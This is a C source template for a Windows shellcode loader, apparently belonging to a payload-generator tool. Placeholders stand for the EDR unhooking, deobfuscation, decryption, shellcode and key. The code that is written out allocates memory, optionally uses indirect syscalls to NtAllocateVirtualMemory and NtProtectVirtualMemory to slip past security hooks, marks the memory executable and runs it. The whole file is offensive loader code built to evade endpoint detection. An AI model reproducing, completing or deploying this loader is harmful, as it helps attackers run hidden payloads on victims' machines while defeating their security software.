
#include <windows.h>
#include <stdio.h>

// {{UNHOOK_PLACEHOLDER}}

// {{NTDLL_UNHOOK_FUNCTION_PLACEHOLDER}}

// {{DEOBFUSCATION_FUNCTION_PLACEHOLDER}}
// {{DECRYPTION_FUNCTION_PLACEHOLDER}}

// {{SYSCALL_FUNCTION_PLACEHOLDER}}

// {{EXECUTION_FUNCTION_PLACEHOLDER}}

// {{SHELLCODE_DEFINITION_PLACEHOLDER}}

unsigned char key[] = { 
    // {{KEY_PLACEHOLDER}}
};

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
    // {{NTDLL_UNHOOK_CALL_PLACEHOLDER}}
    
    // {{SIZE_CALCULATION_PLACEHOLDER}}

    PVOID shellcode_mem = NULL;

#ifdef USE_INDIRECT_SYSCALLS
#ifdef _MSC_VER
    SYSCALL_INFO va_syscall;
    get_ssn("NtAllocateVirtualMemory", &va_syscall);
    SIZE_T size = shellcode_size;
    SyscallStub(NtCurrentProcess(), &shellcode_mem, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, NULL, NULL, NULL, va_syscall.ssn);
#else
    shellcode_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif
#else
    shellcode_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

    if (shellcode_mem == NULL) return 1;

    // {{DEOBFUSCATION_CALL_PLACEHOLDER}}

    // {{DECRYPTION_CALL_PLACEHOLDER}}

    DWORD oldProtect;

#ifdef USE_INDIRECT_SYSCALLS
#ifdef _MSC_VER
    SYSCALL_INFO vp_syscall;
    get_ssn("NtProtectVirtualMemory", &vp_syscall);
    ULONG old_protection;
    SyscallStub(NtCurrentProcess(), &shellcode_mem, &shellcode_size, PAGE_EXECUTE_READ, &old_protection, NULL, NULL, NULL, NULL, NULL, vp_syscall.ssn);
#else
    VirtualProtect(shellcode_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect);
#endif
#else
    VirtualProtect(shellcode_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect);
#endif

    execute(shellcode_mem);

    return 0;
}
